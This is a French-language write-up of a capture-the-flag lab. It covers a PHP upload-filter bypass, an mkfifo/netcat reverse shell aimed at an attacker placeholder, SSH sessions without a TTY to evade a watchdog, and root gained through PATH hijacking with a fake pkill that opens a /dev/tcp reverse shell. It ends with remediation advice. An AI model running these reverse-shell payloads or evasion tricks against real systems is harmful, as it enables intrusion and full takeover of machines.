# Write-up CTF : Élévation de Privilèges via PATH Hijacking & Contournement de Watchdog

Ce dépôt documente le processus complet de test d'intrusion, d'exploitation web, de stabilisation de shell sous contrainte et d'élévation de privilèges jusqu'au niveau `root` sur une machine cible Linux.

---

## 1. Phase d'Énumération & Reconnaissance

L'analyse initiale a été lancée à l'aide de l'outil d'automatisation **Legion**, permettant de cartographier la surface d'attaque externe de la cible.

*   **Port 22 (SSH)** : Ouvert (Service d'accès distant standard).
*   **Port 80 (HTTP)** : Ouvert (Hébergement d'une application web).

---

## 2. Inspection de la Plateforme Web & Exploitation

L'inspection de l'application web sur le port 80 a révélé une fonctionnalité de téléchargement de documents.

1.  **Analyse du code source** : L'examen des sources de la page (`Ctrl + U`) a mis en évidence une restriction insuffisante au niveau du traitement des extensions de fichiers par le code PHP sous-jacent.
2.  **Contournement de la validation** : L'application exigeait un document au format PDF. Pour contourner ce filtre de manière efficace, un fichier nommé `shell.pdf.php` a été téléversé.
3.  **Analyse du trafic (Burp Suite)** : L'interception de la requête via l'onglet *Repeater* de Burp Suite a permis de confirmer la réussite du téléversement et de découvrir la structure d'hébergement, notamment la présence d'un répertoire nommé `/cvs/`.

---

## 3. Établissement du Shell & Gestion du Watchdog

Une fois l'accès au script PHP validé, la phase de reconnaissance locale a commencé afin d'identifier les binaires disponibles (`python3`, `bash`, `nc`, `mkfifo`).

### Le Défi du Watchdog
Les tentatives de connexion directe via `bash` ou `python3` échouaient systématiquement. Le système exécutait un processus de surveillance (*Watchdog*) agressif configuré pour détecter et tuer instantanément les sessions interactives suspectes afin de limiter le bruit.

### Solution de Stabilisation : Le Named Pipe (FIFO)
Pour contourner la détection comportementale du Watchdog, l'utilisation d'un tube nommé (*named pipe*) s'est avérée indispensable pour simuler un flux standard sans allocation immédiate de terminal TTY visible.

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <IP_ATTACKER> <PORT> > /tmp/f
```
La connexion a été interceptée avec succès sur un écouteur Netcat, offrant un accès initial sous l'identité de l'utilisateur de l'application web (`www-data`).

---

## 4. Post-Exploitation & Pivot Utilisateur 

Une inspection minutieuse des répertoires de configuration (`/etc`), des tâches planifiées (`cron`), des processus actifs (`ps`) et des fichiers historiques a été menée.

1.  **Découverte d'identifiants** : La lecture du fichier `.bash_history` a révélé une chaîne de caractères correspondant à une réinitialisation de mot de passe pour l'utilisateur local .
2.  **Contournement du Watchdog via SSH** : Une tentative de connexion SSH classique entraînait une déconnexion immédiate par le Watchdog (boucle réseau exécutant un `pkill -9` sur les terminaux `/dev/pts/*`).
3.  **Session sans allocation de TTY** : Pour s'authentifier de manière stable sans enregistrer la session dans les interfaces surveillées, l'option `-T` de SSH a été exploitée :

```bash
ssh -T user@<TARGET_IP>
```
Cette technique a permis de sécuriser l'accès utilisateur et de récupérer le premier drapeau : **`user.txt`**.

---

## 5. Élévation de Privilèges Root (PATH Hijacking)

L'analyse de la tâche planifiée automatisée (`/etc/cron.d/persistence`) exécutée par `root` a mis en évidence deux faiblesses critiques de configuration :
1.  La variable `$PATH` incluait le répertoire personnel de l'utilisateur (`/home/'le user'/bin/`) en première priorité, avant les répertoires système sécurisés (`/bin`, `/usr/bin`).
2.  Le script interne appelait l'outil système `pkill` de manière relative, sans spécifier son chemin d'accès absolu.

### Exploitation du Chemin d'Accès (Hijacking)
En exploitant l'ordre de priorité de la variable `$PATH`, un script malveillant nommé exactement `pkill` a été injecté dans le répertoire local de l'utilisateur afin d'intercepter l'appel légitime du Cron de `root`.

Création et configuration de la charge utile (configurée ici sur le port alternatif `4445`) :
```bash
echo "#!/bin/bash" > /home/'le user'/bin/pkill 
echo "bash -i >& /dev/tcp/<IP_TUNNEL>/4445 0>&1" >> /home/'le user'/bin/pkill 
chmod +x /home/'le user'/bin/pkill
```

### Capture du drapeau final
Un écouteur Netcat a été configuré en parallèle sur la machine d'attaque :
```bash
nc -lvnp 4445
```

Au déclenchement de la tâche planifiée, le système a exécuté le faux binaire `pkill` avec les privilèges les plus élevés, retournant instantanément un shell interactif disposant des droits administratifs complets (**`root`**), permettant la lecture finale du fichier de preuve `root.txt`.

---

## 6. Mesures de Remédiation (Perspectives Défensives)

*   **Durcissement des Scripts Cron** : Toujours appeler les binaires système par leur chemin absolu (ex: `/usr/bin/pkill` au lieu de `pkill`).
*   **Assainissement des Variables d'Environnement** : Ne jamais inclure de répertoires sous le contrôle d'utilisateurs non privilégiés (comme `/home/user/bin`) dans la variable `$PATH` globale des processus exécutés par `root`.
*   **Sécurisation du Téléversement** : Mettre en œuvre une vérification stricte du type MIME des fichiers côté serveur et interdire l'exécution de scripts (`.php`) dans les répertoires de stockage publics.
